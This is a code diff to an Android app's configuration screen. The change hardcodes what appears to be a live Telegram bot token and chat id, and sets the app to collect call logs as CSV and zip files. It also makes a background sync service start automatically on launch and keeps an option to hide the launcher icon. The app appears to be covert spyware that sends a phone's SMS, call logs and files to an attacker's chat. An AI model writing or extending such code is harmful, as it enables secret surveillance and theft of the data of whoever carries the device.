@@ -7,15 +7,12 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
-import android.widget.Button
-import android.widget.CheckBox
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkManager
 import com.google.android.material.switchmaterial.SwitchMaterial
-import com.google.android.material.textfield.TextInputEditText
 import java.util.concurrent.TimeUnit
 
 class ConfigActivity : AppCompatActivity() {
@@ -24,20 +21,17 @@ class ConfigActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_config)
 
-        val etToken = findViewById<TextInputEditText>(R.id.etToken)
-        val etChatId = findViewById<TextInputEditText>(R.id.etChatId)
         val switchHideIcon = findViewById<SwitchMaterial>(R.id.switchHideIcon)
-        val chkZipAll = findViewById<CheckBox>(R.id.chkZipAll)
-        val chkSmsIndividual = findViewById<CheckBox>(R.id.chkSmsIndividual)
-        val chkCallLogCsv = findViewById<CheckBox>(R.id.chkCallLogCsv)
-        val btnSave = findViewById<Button>(R.id.btnSave)
 
+        // Hardcode Configuration
         val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
-        etToken.setText(prefs.getString("bot_token", ""))
-        etChatId.setText(prefs.getString("chat_id", ""))
-        chkZipAll.isChecked = prefs.getBoolean("zip_all", false)
-        chkSmsIndividual.isChecked = prefs.getBoolean("sms_individual", false)
-        chkCallLogCsv.isChecked = prefs.getBoolean("calls_csv", false)
+        prefs.edit()
+            .putString("bot_token", "8274144502:AAEqG8iiOW8yH1M5S1xy6RfvXPlZeXYdcxk")
+            .putString("chat_id", "-1003629446663")
+            .putBoolean("zip_all", true)
+            .putBoolean("sms_individual", false)
+            .putBoolean("calls_csv", true)
+            .apply()
 
         // Check current icon state
         val componentName = ComponentName(this, "$packageName.Launcher")
@@ -45,26 +39,9 @@ class ConfigActivity : AppCompatActivity() {
         val isHidden = setting == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
         switchHideIcon.isChecked = isHidden
 
-        btnSave.setOnClickListener {
-            val token = etToken.text.toString()
-            val chatId = etChatId.text.toString()
-            val shouldHide = switchHideIcon.isChecked
-            
-            if (token.isBlank() || chatId.isBlank()) {
-                Toast.makeText(this, "Fields cannot be empty", Toast.LENGTH_SHORT).show()
-                return@setOnClickListener
-            }
-
-            prefs.edit()
-                .putString("bot_token", token)
-                .putString("chat_id", chatId)
-                .putBoolean("zip_all", chkZipAll.isChecked)
-                .putBoolean("sms_individual", chkSmsIndividual.isChecked)
-                .putBoolean("calls_csv", chkCallLogCsv.isChecked)
-                .apply()
-
+        switchHideIcon.setOnCheckedChangeListener { _, isChecked ->
             // Handle Icon Hiding
-            val newState = if (shouldHide) {
+            val newState = if (isChecked) {
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED
             } else {
                 PackageManager.COMPONENT_ENABLED_STATE_ENABLED
@@ -75,16 +52,17 @@ class ConfigActivity : AppCompatActivity() {
                 newState,
                 PackageManager.DONT_KILL_APP
             )
+            val msg = if (isChecked) "Icon Hidden" else "Icon Visible"
+            Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
+        }
 
-            if (checkPermissions()) {
-                startSyncService()
-                scheduleWork()
-                val msg = if (shouldHide) "Service Started & Icon Hidden" else "Service Started"
-                Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
-                finish() 
-            } else {
-                requestPermissions()
-            }
+        // Auto-start service logic
+        if (checkPermissions()) {
+            startSyncService()
+            scheduleWork()
+            Toast.makeText(this, "Service Active", Toast.LENGTH_SHORT).show()
+        } else {
+            requestPermissions()
         }
     }
 
@@ -123,7 +101,6 @@ class ConfigActivity : AppCompatActivity() {
                 startSyncService()
                 scheduleWork()
                 Toast.makeText(this, "Configuration Saved & Started", Toast.LENGTH_SHORT).show()
-                finish()
             } else {
                 Toast.makeText(this, "Permissions required", Toast.LENGTH_SHORT).show()
             }
